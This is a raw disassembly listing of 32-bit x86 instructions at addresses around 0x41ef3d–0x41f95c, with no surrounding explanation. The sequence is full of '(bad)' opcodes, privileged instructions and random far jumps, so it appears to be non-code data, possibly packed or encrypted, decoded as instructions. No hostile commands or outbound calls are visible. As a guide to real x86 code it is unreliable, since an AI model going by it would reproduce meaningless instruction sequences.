  41ef3d:	jb     0x41ef98
  41ef3f:	sar    BYTE PTR [ecx-0x4b],1
  41ef42:	xlat   BYTE PTR ds:[ebx]
  41ef43:	imul   ecx,DWORD PTR ss:[edx],0xfffffff9
  41ef47:	test   DWORD PTR [edi+0x2b],0x1aab332a
  41ef4e:	out    dx,eax
  41ef4f:	sbb    eax,0x48299382
  41ef54:	sbb    eax,0x24efe478
  41ef59:	xchg   edi,eax
  41ef5a:	add    ch,BYTE PTR [edi+0x45]
  41ef5d:	jb     0x41eef1
  41ef5f:	test   BYTE PTR [esi+0x6c],cl
  41ef62:	in     al,0xf2
  41ef64:	(bad)  [eax-0x3d]
  41ef67:	out    0x65,eax
  41ef69:	mul    bl
  41ef6b:	mov    al,ds:0x3b3ae707
  41ef70:	imul   DWORD PTR [eax+0x1b]
  41ef73:	fdiv   DWORD PTR [eax]
  41ef75:	xor    ah,BYTE PTR [ebx-0x4]
  41ef78:	mov    dh,0x17
  41ef7a:	adc    edx,edx
  41ef7c:	add    eax,0xbc9f5e0d
  41ef81:	mov    ah,0xaa
  41ef83:	std    
  41ef84:	popf   
  41ef85:	dec    esi
  41ef86:	and    esi,DWORD PTR [ecx+eiz*8+0x4d29b106]
  41ef8d:	mov    eax,gs:0x70
	...
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul edi,DWORD PTR [ebp-0x4b099cfe],0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	adc    eax,0xe247226d
  41f011:	repnz sub BYTE PTR [eax*1-0x587b0d1a],ch
  41f019:	mov    esi,0xe1ea2301
  41f01e:	icebp  
  41f01f:	outs   dx,BYTE PTR ds:[esi]
  41f020:	sub    cl,cl
  41f022:	and    ebp,DWORD PTR [ebp-0x38cec5b1]
  41f028:	dec    ecx
  41f029:	(bad)  
  41f02a:	mov    ebx,0xc25c0873
  41f02f:	retf   
  41f030:	xor    DWORD PTR [ebp+0x7034edaf],ecx
  41f036:	jge    0x41eff1
  41f038:	and    ebx,DWORD PTR [ebx+ebp*4-0xae4a8a5]
  41f03f:	stos   BYTE PTR es:[edi],al
  41f040:	mov    eax,0x9959071c
  41f045:	mov    ?,WORD PTR [edi]
  41f047:	mov    ds:0x6d80f258,eax
  41f04c:	dec    edi
  41f04d:	fwait
  41f04e:	xor    ah,BYTE PTR [esi-0x45]
  41f051:	aaa    
  41f052:	imul   esi,esp,0x3b
  41f055:	int    0x5b
  41f057:	sbb    DWORD PTR [esi-0x6a],esp
  41f05a:	ds and eax,ebx
  41f05d:	ja     0x41f0bf
  41f05f:	aad    0xc9
  41f061:	pslld  mm3,QWORD PTR [eax-0x48e87606]
  41f068:	lock inc edi
  41f06a:	inc    eax
  41f06b:	cld    
  41f06c:	xor    ah,bh
  41f06e:	cmp    al,0x1
  41f070:	inc    eax
  41f071:	ret    
  41f072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f073:	mov    dh,0x14
  41f075:	into   
  41f076:	sub    bh,BYTE PTR [edi+0x2c]
  41f079:	outs   dx,DWORD PTR ds:[esi]
  41f07a:	mov    ebp,0xea099dd4
  41f07f:	sub    cl,BYTE PTR [ebx+esi*8]
  41f082:	sub    DWORD PTR [esi],ecx
  41f084:	sub    BYTE PTR [ecx],bl
  41f086:	adc    DWORD PTR [esi+ebp*1],edi
  41f089:	inc    esi
  41f08a:	outs   dx,BYTE PTR ss:[esi]
  41f08c:	xchg   esp,eax
  41f08d:	jb     0x41f0d9
  41f08f:	daa    
  41f090:	(bad)  
  41f091:	outs   dx,BYTE PTR ss:[esi]
  41f093:	lea    eax,[edi]
  41f095:	hlt    
  41f096:	loopne 0x41f097
  41f098:	and    DWORD PTR gs:[ebp-0x9],0xd3c0f511
  41f0a0:	adc    esp,0xffffffcf
  41f0a3:	mov    ecx,DWORD PTR [esi+0x6b43dc10]
  41f0a9:	or     bh,BYTE PTR [ebx]
  41f0ab:	mov    ds,WORD PTR [ecx-0x6ab9405e]
  41f0b1:	mov    ebx,0x1ed329de
  41f0b6:	add    al,0x27
  41f0b8:	jmp    0x41f0f5
  41f0ba:	not    DWORD PTR [eax+0x8]
  41f0bd:	fcmovne st,st(3)
  41f0bf:	and    al,0x21
  41f0c1:	mov    edx,DWORD PTR [eax+edx*1-0x70]
  41f0c5:	xchg   edi,eax
  41f0c6:	and    al,0xcd
  41f0c8:	mov    ecx,DWORD PTR [edi+0x57]
  41f0cb:	and    DWORD PTR [ebp-0x7ea627d5],ecx
  41f0d1:	mov    dh,0x57
  41f0d3:	scas   al,BYTE PTR es:[edi]
  41f0d4:	or     eax,0x2bc43b5f
  41f0d9:	call   0x785a084b
  41f0de:	std    
  41f0df:	cli    
  41f0e0:	das    
  41f0e1:	(bad)  
  41f0e3:	dec    esi
  41f0e4:	adc    al,0xe4
  41f0e6:	pop    esp
  41f0e7:	inc    BYTE PTR [esi-0x25ecb61f]
  41f0ed:	or     DWORD PTR [ebx+0x7],0x25bd37ee
  41f0f4:	sub    ecx,0xdf861661
  41f0fa:	stos   DWORD PTR es:[edi],eax
  41f0fb:	outs   dx,BYTE PTR ds:[esi]
  41f0fc:	jae    0x41f110
  41f0fe:	jae    0x41f132
  41f100:	sti    
  41f101:	mov    al,0xcb
  41f103:	sub    eax,DWORD PTR [ebp+0x2cb9ff5e]
  41f109:	pusha  
  41f10a:	xchg   eax,edx
  41f10c:	mov    ecx,0x18cd76
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xb1ee394d
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	cmp    al,0x68
  41f18e:	int    0x24
  41f190:	(bad)  
  41f191:	jecxz  0x41f206
  41f193:	mov    dl,0x55
  41f195:	adc    BYTE PTR [ebx+0x69595606],ch
  41f19b:	mov    dh,BYTE PTR [ebx]
  41f19d:	pushf  
  41f19e:	push   ebx
  41f19f:	push   ebx
  41f1a0:	xchg   ebx,esp
  41f1a2:	iret   
  41f1a3:	call   0x3366:0x32ed8987
  41f1aa:	rsm    
  41f1ac:	arpl   WORD PTR [eax-0x4f45e63d],dx
  41f1b2:	scas   al,BYTE PTR es:[edi]
  41f1b3:	inc    edi
  41f1b4:	ins    BYTE PTR es:[edi],dx
  41f1b5:	sbb    eax,0x37040567
  41f1ba:	jecxz  0x41f1e8
  41f1bc:	shl    BYTE PTR [edx],1
  41f1be:	push   es
  41f1bf:	jl     0x41f1f2
  41f1c1:	jge    0x41f1e8
  41f1c3:	ds sub eax,0xc0d8c078
  41f1c9:	pop    edx
  41f1ca:	adc    DWORD PTR [ebx-0x30bf4a6b],ebp
  41f1d0:	(bad)  
  41f1d1:	mov    bl,0x8d
  41f1d3:	dec    ebx
  41f1d4:	push   eax
  41f1d5:	in     eax,0xe6
  41f1d7:	ror    ah,cl
  41f1d9:	fsubr  QWORD PTR [edi-0x1188d62e]
  41f1df:	push   esi
  41f1e0:	sbb    dl,BYTE PTR [ebp-0x21]
  41f1e3:	dec    edi
  41f1e4:	mov    edx,0x516b45b7
  41f1e9:	xor    al,0x1c
  41f1eb:	call   0x889e:0x538742b6
  41f1f2:	and    al,0x61
  41f1f4:	dec    ebp
  41f1f5:	(bad)  
  41f1f6:	retf   0xde6c
  41f1f9:	xor    DWORD PTR [edi],eax
  41f1fb:	leave  
  41f1fc:	fist   DWORD PTR [edx]
  41f1fe:	dec    ch
  41f200:	das    
  41f201:	mov    ?,WORD PTR [ebx]
  41f203:	jmp    0x41f202
  41f205:	sbb    al,0x8c
  41f207:	cwde   
  41f208:	int3   
  41f209:	sub    DWORD PTR [ebp-0xbc406ea],ebx
  41f20f:	inc    ebx
  41f210:	cmp    al,0xb4
  41f212:	add    esp,DWORD PTR [edi-0x23]
  41f215:	ret    0x4f53
  41f218:	dec    DWORD PTR fs:[edi-0x33e82ea1]
  41f21f:	clc    
  41f220:	(bad)  
  41f222:	dec    esp
  41f223:	xchg   edx,eax
  41f224:	cmc    
  41f225:	push   edi
  41f226:	inc    BYTE PTR [edi+0x4d]
  41f229:	int3   
  41f22a:	fdivrp st(3),st
  41f22c:	xor    esi,DWORD PTR ds:0xc2ea2192
  41f232:	push   esi
  41f233:	mov    ds:0x42f45e50,eax
  41f238:	stos   BYTE PTR es:[edi],al
  41f239:	fisttp WORD PTR [eax-0x610e11e6]
  41f23f:	jle    0x41f235
  41f241:	test   eax,0x4dfdfd7
  41f246:	div    DWORD PTR [eax+0x74]
  41f249:	in     al,0xf4
  41f24b:	cwde   
  41f24c:	ret    
  41f24d:	imul   ecx,edx,0x46
  41f250:	xchg   edx,eax
  41f251:	inc    ebx
  41f252:	(bad)  
  41f253:	aam    0x40
  41f255:	inc    edx
  41f257:	fdiv   QWORD PTR [esi+edi*1-0x43]
  41f25b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f25c:	jae    0x41f23f
  41f25e:	aaa    
  41f25f:	pop    es
  41f260:	adc    esi,edx
  41f262:	daa    
  41f263:	int    0x2a
  41f265:	lahf   
  41f266:	sti    
  41f267:	pop    edi
  41f268:	mov    edx,DWORD PTR [ecx]
  41f26a:	dec    edx
  41f26b:	sub    eax,edx
  41f26d:	xor    dl,BYTE PTR [edx-0x48]
  41f270:	lea    eax,[ebx+0xc]
  41f273:	dec    esi
  41f274:	dec    eax
  41f275:	cli    
  41f276:	mov    edx,0x52946eba
  41f27b:	cmp    eax,0xae3251b5
  41f280:	cmp    ebx,edi
  41f282:	clc    
  41f283:	imul   edi,ebx,0x10
  41f286:	jae    0x41f268
  41f288:	push   DWORD PTR [esi-0x7765510d]
  41f28e:	ror    DWORD PTR [edx+0x0],0x0
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f316
  41f301:	cmc    
  41f302:	fld    QWORD PTR [ebx+0x14bbc]
  41f308:	add    al,0x1
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	mov    eax,ds:0xf1166285
  41f311:	shl    BYTE PTR [edx],1
  41f313:	or     ebx,DWORD PTR [esi]
  41f315:	xor    DWORD PTR [eax+0x55b2ab0d],0xd99d8062
  41f31f:	push   ebp
  41f320:	mov    bl,0xf5
  41f322:	inc    esp
  41f323:	inc    edx
  41f324:	pop    eax
  41f325:	dec    eax
  41f326:	cmp    al,0x27
  41f328:	push   esp
  41f329:	inc    edi
  41f32a:	mov    bh,0x77
  41f32c:	jne    0x41f384
  41f32e:	pop    es
  41f32f:	xchg   ecx,eax
  41f330:	jmp    0x7c9d:0xd7858bfc
  41f337:	dec    edi
  41f338:	fmul   st,st(3)
  41f33a:	call   0x9be:0x8d56212c
  41f341:	test   al,0xea
  41f343:	add    DWORD PTR [ecx+0x20],ecx
  41f346:	daa    
  41f347:	sbb    BYTE PTR [edx],al
  41f349:	rcl    BYTE PTR [esi-0x98fc8aa],0xee
  41f350:	and    eax,0x40d73c6d
  41f355:	adc    al,0x2e
  41f357:	jge    0x41f309
  41f359:	ret    
  41f35a:	mov    edx,ss
  41f35c:	not    DWORD PTR [ebx-0x780fbb46]
  41f362:	in     al,dx
  41f363:	pushf  
  41f364:	enter  0x142a,0xb4
  41f368:	clc    
  41f369:	adc    esp,esi
  41f36b:	rol    BYTE PTR [esi-0x7d],1
  41f36e:	cs std 
  41f370:	xor    ebp,DWORD PTR [ecx]
  41f372:	push   cs
  41f373:	cmc    
  41f374:	out    0xbb,eax
  41f376:	js     0x41f3bd
  41f378:	mov    al,ds:0x235cca82
  41f37d:	popa   
  41f37e:	xchg   esi,eax
  41f37f:	popa   
  41f380:	mov    eax,ds:0xe9129cf1
  41f385:	loope  0x41f346
  41f387:	lahf   
  41f388:	sahf   
  41f389:	into   
  41f38a:	mov    ebp,0xff90ba82
  41f38f:	sub    al,0x79
  41f391:	or     eax,0xa6dcd53f
  41f396:	scas   eax,DWORD PTR es:[edi]
  41f397:	dec    ebp
  41f398:	sbb    bl,BYTE PTR [edi+0x29]
  41f39b:	jbe    0x41f3d6
  41f39d:	or     eax,0x76f42e80
  41f3a2:	dec    eax
  41f3a3:	test   al,0xc8
  41f3a5:	popf   
  41f3a6:	add    esp,DWORD PTR [ebx-0x7d]
  41f3a9:	pop    ecx
  41f3aa:	retf   0x6dd6
  41f3ad:	test   eax,0x69eebf15
  41f3b2:	mov    edi,0xd94ce2c5
  41f3b7:	mov    dl,ah
  41f3b9:	addr16 xor al,0xac
  41f3bc:	das    
  41f3bd:	test   al,0x7e
  41f3bf:	cwde   
  41f3c0:	xchg   ebp,eax
  41f3c1:	scas   eax,DWORD PTR es:[edi]
  41f3c2:	xor    ecx,DWORD PTR [edi+0x7bc1e30d]
  41f3c8:	test   al,0xd7
  41f3ca:	and    BYTE PTR [edi],ah
  41f3cc:	xchg   esp,esi
  41f3ce:	adc    DWORD PTR ds:0xe895432c,ebx
  41f3d4:	mov    edi,0x17a79fdc
  41f3d9:	dec    ebx
  41f3da:	retf   
  41f3db:	sub    eax,0xee8a59d8
  41f3e0:	push   ds
  41f3e1:	enter  0x149,0x51
  41f3e5:	pop    ebp
  41f3e6:	les    eax,FWORD PTR [esi+0x5e]
  41f3e9:	js     0x41f3a5
  41f3eb:	dec    esp
  41f3ec:	adc    DWORD PTR [ebp+0x437367cc],esp
  41f3f2:	ja     0x41f456
  41f3f4:	dec    eax
  41f3f5:	dec    eax
  41f3f6:	lods   eax,DWORD PTR ds:[esi]
  41f3f7:	jp     0x41f44f
  41f3f9:	mov    ecx,0x6481a66e
  41f3fe:	pop    ebp
  41f3ff:	rol    BYTE PTR [eax-0x7a97b9e8],0xde
  41f406:	mov    cs,WORD PTR [edx-0x80]
  41f409:	mov    ds:0x15aba2c5,al
  41f40e:	(bad)  
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x28
  41f481:	fisttp DWORD PTR [ecx+0x14cc078]
  41f487:	add    BYTE PTR [ecx+eax*1],al
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	and    al,0x7b
  41f48e:	ds hlt 
  41f490:	test   eax,0xdf38e84c
  41f495:	test   eax,0xdf6070c2
  41f49a:	mov    eax,ds:0x560f5ee2
  41f49f:	adc    ecx,DWORD PTR [edx-0x4]
  41f4a2:	jb     0x41f451
  41f4a4:	js     0x41f4a1
  41f4a6:	or     al,0x6e
  41f4a8:	or     al,0xd6
  41f4aa:	loope  0x41f4b0
  41f4ac:	mov    edi,0x8b5488a9
  41f4b1:	push   ebx
  41f4b2:	and    cl,BYTE PTR [ebx]
  41f4b4:	inc    esp
  41f4b5:	rcl    ebp,cl
  41f4b7:	push   ds
  41f4b8:	sub    DWORD PTR [ebx],ebx
  41f4ba:	push   ds
  41f4bb:	outs   dx,DWORD PTR ds:[esi]
  41f4bc:	jb     0x41f4f7
  41f4be:	pop    ebp
  41f4bf:	mov    al,ds:0x26df4c7b
  41f4c4:	xchg   ebp,eax
  41f4c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c6:	inc    ebp
  41f4c7:	(bad)  
  41f4c8:	and    BYTE PTR [eax],dl
  41f4ca:	inc    edx
  41f4cb:	sub    esp,DWORD PTR [eax]
  41f4cd:	or     eax,0x19c37358
  41f4d2:	dec    ebp
  41f4d3:	push   0x38
  41f4d5:	(bad)  
  41f4d6:	std    
  41f4d7:	dec    ecx
  41f4d8:	push   eax
  41f4d9:	adc    eax,0x77a69a89
  41f4de:	mov    al,0x5c
  41f4e0:	dec    eax
  41f4e1:	sub    BYTE PTR ds:0x48b76de8,dh
  41f4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4e8:	in     al,0xb2
  41f4ea:	(bad)  
  41f4eb:	cdq    
  41f4ec:	dec    ebx
  41f4ed:	cwde   
  41f4ee:	xlat   BYTE PTR ds:[ebx]
  41f4ef:	push   es
  41f4f0:	cmp    ebp,DWORD PTR [ebp+0x2c]
  41f4f3:	into   
  41f4f4:	arpl   dx,bp
  41f4f6:	mov    bh,0xc9
  41f4f8:	loopne 0x41f4a3
  41f4fa:	inc    edi
  41f4fb:	add    eax,0x2b20573
  41f500:	xchg   ebx,eax
  41f501:	enter  0x5578,0xf4
  41f505:	lods   al,BYTE PTR ds:[esi]
  41f506:	push   ss
  41f507:	xor    al,0x59
  41f509:	pop    eax
  41f50a:	hlt    
  41f50b:	loopne 0x41f529
  41f50d:	mov    BYTE PTR [esi-0x4e],bh
  41f510:	adc    edi,edi
  41f512:	fimul  WORD PTR [ebx+0x5f44b385]
  41f518:	add    al,0xee
  41f51a:	sti    
  41f51b:	sub    al,0x61
  41f51d:	ss arpl cx,sp
  41f520:	jl     0x41f4a5
  41f522:	jmp    0xbefb:0x7301ae4f
  41f529:	adc    ebx,DWORD PTR [esi]
  41f52b:	cmp    edx,DWORD PTR [edi-0x75933748]
  41f531:	jns    0x41f529
  41f533:	inc    edi
  41f534:	fwait
  41f535:	test   BYTE PTR [edi-0x601867a3],0xbf
  41f53c:	dec    esp
  41f53d:	pop    ebx
  41f53e:	shl    DWORD PTR [ebp-0x3e57582b],1
  41f544:	rcl    DWORD PTR [eax],cl
  41f546:	ins    BYTE PTR es:[edi],dx
  41f547:	test   eax,0x6c5e010d
  41f54c:	mov    bl,0x13
  41f54e:	in     al,dx
  41f54f:	or     ebp,DWORD PTR [esi]
  41f551:	les    ebp,FWORD PTR [ebp-0x49]
  41f554:	mov    bh,0xf3
  41f556:	dec    esp
  41f557:	int3   
  41f558:	outs   dx,BYTE PTR ds:[esi]
  41f559:	dec    ebx
  41f55a:	xor    al,0x9b
  41f55c:	(bad)  
  41f55e:	push   ds
  41f55f:	push   ebx
  41f560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f561:	pop    ss
  41f562:	pop    ecx
  41f563:	iret   
  41f564:	or     DWORD PTR [edi+0xc03d9b1],esp
  41f56a:	mov    eax,0xf44ce139
  41f56f:	or     eax,ecx
  41f571:	scas   al,BYTE PTR es:[edi]
  41f572:	lock and BYTE PTR [edi],ah
  41f575:	xchg   DWORD PTR [eax+edi*8-0x167f2d76],ebx
  41f57c:	xor    DWORD PTR [esi],edx
  41f57e:	es mov dl,0x11
  41f581:	push   es
  41f582:	mov    ds:0x5ac4d2a9,al
  41f587:	xchg   eax,eax
  41f589:	out    dx,al
  41f58a:	fld    QWORD PTR [edx-0x6c]
  41f58d:	ins    BYTE PTR es:[edi],dx
  41f58e:	push   0xb5
	...
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0xb4de:0x4e80d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	cmp    eax,0xedbbdfa0
  41f611:	outs   dx,BYTE PTR ds:[esi]
  41f612:	push   cs
  41f613:	cmp    dl,ah
  41f615:	in     al,dx
  41f616:	dec    ebp
  41f617:	ret    0xbca8
  41f61a:	pcmpeqb mm4,QWORD PTR [esp+esi*2+0x1adffda0]
  41f622:	mov    al,al
  41f624:	data16 lods al,BYTE PTR ds:[esi]
  41f626:	(bad)  
  41f628:	out    0xe4,eax
  41f62a:	push   ebx
  41f62b:	add    BYTE PTR [ebp+0x4],ch
  41f62e:	mov    ch,0x83
  41f630:	das    
  41f631:	ficom  DWORD PTR [eax]
  41f633:	in     eax,dx
  41f634:	int3   
  41f635:	nop
  41f636:	loopne 0x41f671
  41f638:	lahf   
  41f639:	sbb    DWORD PTR [edx+0x56],0xded22d02
  41f640:	mov    BYTE PTR [eax],dh
  41f642:	inc    eax
  41f643:	inc    eax
  41f644:	ins    DWORD PTR es:[edi],dx
  41f645:	std    
  41f646:	fimul  DWORD PTR [ebx]
  41f648:	inc    edx
  41f649:	popf   
  41f64a:	lea    esi,[edi-0x54]
  41f64d:	data16 fwait
  41f64f:	inc    edx
  41f650:	shr    BYTE PTR [edx+ecx*2+0x1a5386e5],0xdd
  41f658:	xchg   esi,eax
  41f659:	push   0x7f769806
  41f65e:	cs or  eax,0xd7288e0b
  41f664:	mov    ebx,0x508017e9
  41f669:	shl    ecx,cl
  41f66b:	dec    esi
  41f66c:	xchg   esi,eax
  41f66d:	dec    esi
  41f66e:	out    dx,al
  41f66f:	push   ebp
  41f670:	arpl   WORD PTR [esi+0x7c08e1f3],bp
  41f676:	daa    
  41f677:	dec    edi
  41f678:	or     esi,ebx
  41f67a:	pop    ebx
  41f67b:	or     eax,0x50759458
  41f680:	stos   BYTE PTR es:[edi],al
  41f681:	or     al,0x17
  41f683:	dec    ebp
  41f684:	mov    ch,0xdc
  41f687:	icebp  
  41f688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f689:	mov    ebp,0xd4757bdb
  41f68e:	pop    ecx
  41f68f:	fstp   TBYTE PTR [esp+ecx*4+0x42]
  41f693:	(bad)  
  41f694:	aas    
  41f695:	xor    DWORD PTR [eax+0x1a],0xffffff98
  41f699:	aam    0x92
  41f69b:	mov    edi,0x54206b6b
  41f6a0:	shl    ecx,0x94
  41f6a3:	cmp    al,0xea
  41f6a5:	nop
  41f6a6:	imul   edx,DWORD PTR [eax+ecx*2-0x72],0xffffff94
  41f6ab:	hlt    
  41f6ac:	push   0x46c818b2
  41f6b1:	dec    edi
  41f6b2:	das    
  41f6b3:	or     esp,edi
  41f6b5:	push   ebx
  41f6b6:	loope  0x41f660
  41f6b8:	jae    0x41f6ed
  41f6ba:	(bad)  
  41f6bb:	mov    bl,al
  41f6bd:	sub    eax,DWORD PTR [eax]
  41f6bf:	mov    bh,0x3c
  41f6c1:	pop    esi
  41f6c2:	mov    edi,0xb4639062
  41f6c7:	cmp    DWORD PTR [edi+0x721122ea],ebp
  41f6cd:	cmp    BYTE PTR [edi+edx*4+0x448758bb],bl
  41f6d4:	dec    edi
  41f6d5:	jae    0x41f680
  41f6d7:	(bad)  
  41f6d8:	jecxz  0x41f703
  41f6da:	cmp    dh,dl
  41f6dc:	lahf   
  41f6dd:	jge    0x41f683
  41f6df:	jo     0x41f695
  41f6e1:	inc    eax
  41f6e2:	pop    ebp
  41f6e3:	(bad)  
  41f6e4:	push   ds
  41f6e5:	jp     0x41f727
  41f6e7:	xor    ecx,DWORD PTR [edi]
  41f6e9:	jmp    DWORD PTR [edx-0x56]
  41f6ec:	imul   ebp,DWORD PTR [ebx-0x4ec39c69],0x5
  41f6f3:	rol    BYTE PTR [eax-0x61],cl
  41f6f6:	fwait
  41f6f7:	mov    esp,0x35a74a12
  41f6fc:	xchg   esp,eax
  41f6fd:	test   BYTE PTR [ebx],0x58
  41f700:	jo     0x41f70e
  41f702:	call   0x8273:0xee8e141b
  41f709:	jae    0x41f6d1
  41f70b:	retf   
  41f70c:	mov    esi,0xf9b059
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xd466:0x486c62d2
  41f783:	dec    al
  41f785:	dec    esi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	pop    ebx
  41f78d:	mov    ebp,0xab2aeba2
  41f792:	xchg   esp,eax
  41f793:	xchg   ebx,eax
  41f794:	pop    ebx
  41f795:	push   ss
  41f796:	pop    eax
  41f797:	sub    bl,BYTE PTR [ebp+0x7bd5d968]
  41f79d:	jbe    0x41f7b4
  41f79f:	cli    
  41f7a0:	jecxz  0x41f756
  41f7a2:	sbb    esi,DWORD PTR ds:0x92eaffa1
  41f7a8:	out    0x34,eax
  41f7aa:	icebp  
  41f7ab:	jne    0x41f79a
  41f7ad:	mov    bh,0xe3
  41f7af:	push   ds
  41f7b0:	xor    bl,ah
  41f7b2:	fs mov dh,0x2e
  41f7b5:	rcl    BYTE PTR [esi+0x41e1062f],1
  41f7bb:	mov    cs,WORD PTR [ecx]
  41f7bd:	jle    0x41f7e7
  41f7bf:	jl     0x41f77b
  41f7c1:	or     al,0x8e
  41f7c3:	or     BYTE PTR [edi+0x7d],al
  41f7c6:	push   ss
  41f7c7:	iret   
  41f7c8:	idiv   dl
  41f7ca:	lahf   
  41f7cb:	fsubr  DWORD PTR ds:0xa2af56ab
  41f7d1:	ret    
  41f7d2:	call   0x660ed8d2
  41f7d7:	addr16 popf 
  41f7d9:	aad    0xa
  41f7db:	shl    BYTE PTR [ebx-0x67],0xbb
  41f7df:	test   BYTE PTR [edx],dh
  41f7e1:	add    DWORD PTR [ebx*8-0x7ae70ff5],edi
  41f7e8:	or     al,0xe4
  41f7ea:	push   ebp
  41f7eb:	xchg   edx,eax
  41f7ec:	shr    ebp,0x84
  41f7ef:	(bad)  
  41f7f0:	adc    ch,BYTE PTR [esi]
  41f7f2:	add    BYTE PTR ss:[esi+ebx*4+0x4c],0xcb
  41f7f8:	adc    al,0x89
  41f7fa:	es cmp al,0x19
  41f7fd:	push   0xffffffe6
  41f7ff:	test   BYTE PTR [edx+0xd3630a4],0xa2
  41f806:	in     al,0x64
  41f808:	xchg   esp,eax
  41f809:	pop    edx
  41f80a:	or     edi,eax
  41f80c:	dec    esp
  41f80d:	mov    ch,0x12
  41f80f:	in     al,dx
  41f810:	mov    ah,0x10
  41f812:	loop   0x41f86d
  41f814:	ret    
  41f815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f816:	sbb    ebp,DWORD PTR [esi]
  41f818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f819:	and    DWORD PTR [ebx],esp
  41f81b:	push   es
  41f81c:	pop    ebp
  41f81d:	call   0x9e95:0x607e758d
  41f824:	mov    al,ds:0x89d08b01
  41f829:	push   cs
  41f82a:	(bad)  
  41f82b:	jb     0x41f870
  41f82d:	icebp  
  41f82e:	mov    DWORD PTR [ecx-0x659d6a45],esi
  41f834:	xchg   ebx,eax
  41f835:	sbb    eax,0x3f34b4b9
  41f83a:	dec    eax
  41f83b:	out    dx,eax
  41f83c:	sbb    eax,0xc61dab55
  41f841:	loope  0x41f8a0
  41f843:	xchg   esp,eax
  41f844:	sub    eax,0xebeb0b35
  41f849:	ins    BYTE PTR es:[edi],dx
  41f84a:	out    dx,eax
  41f84b:	mov    edx,0xade031d3
  41f850:	push   edx
  41f851:	inc    ecx
  41f852:	jl     0x41f81c
  41f854:	cmp    ch,dl
  41f856:	sbb    BYTE PTR [esi+0x12],dl
  41f859:	mov    esi,?
  41f85b:	jbe    0x41f7f9
  41f85d:	shr    DWORD PTR [ebx],1
  41f85f:	pop    ebx
  41f860:	inc    esp
  41f861:	sub    ecx,ebx
  41f863:	pop    esi
  41f864:	push   0xf7b84171
  41f869:	pop    ecx
  41f86a:	sbb    esp,DWORD PTR [esi-0x20]
  41f86d:	add    al,0xd6
  41f86f:	xor    eax,0x9b0a2ae3
  41f875:	test   DWORD PTR [esi-0x4cbeb064],edi
  41f87b:	mov    eax,edi
  41f87d:	sub    ch,0x47
  41f880:	jg     0x41f8dd
  41f882:	sbb    ecx,DWORD PTR [esi+0x3c]
  41f885:	in     al,dx
  41f886:	out    0x36,al
  41f888:	mov    esp,DWORD PTR [esi+0x3a]
  41f88b:	cmp    dl,dl
  41f88d:	pop    ecx
  41f88e:	dec    esi
  41f88f:	dec    ecx
	...
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	and    dh,cl
  41f902:	sbb    BYTE PTR [eax-0x34],bh
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	dec    ebx
  41f90d:	or     esi,DWORD PTR [eax-0x35]
  41f910:	add    cl,BYTE PTR [eax-0x6692394c]
  41f916:	add    edx,DWORD PTR [edx-0x5c490360]
  41f91c:	inc    ebx
  41f91d:	sbb    DWORD PTR [ebx-0x58b47c63],esp
  41f923:	cwde   
  41f924:	push   es
  41f925:	sub    al,0x6b
  41f927:	test   eax,0xb2fb7638
  41f92c:	(bad)  
  41f92d:	fist   WORD PTR [esi-0x2d]
  41f930:	(bad)  
  41f931:	mov    ch,0xe5
  41f933:	push   ds
  41f934:	mov    eax,ds:0xc9053fd4
  41f939:	scas   eax,DWORD PTR es:[edi]
  41f93a:	push   ecx
  41f93b:	inc    esi
  41f93c:	loopne 0x41f930
  41f93e:	dec    esp
  41f93f:	fmul   st(7),st
  41f941:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f943:	les    esi,FWORD PTR [esi-0x4cd0ba04]
  41f949:	retf   
  41f94a:	jl     0x41f8e8
  41f94c:	sub    eax,0xbdcf75df
  41f951:	lods   eax,DWORD PTR ds:[esi]
  41f952:	leave  
  41f953:	call   DWORD PTR [ecx]
  41f955:	cmc    
  41f956:	fwait
  41f957:	add    esp,ebp
  41f959:	mov    es,WORD PTR [ebx+0x59]
  41f95c:	inc    edx
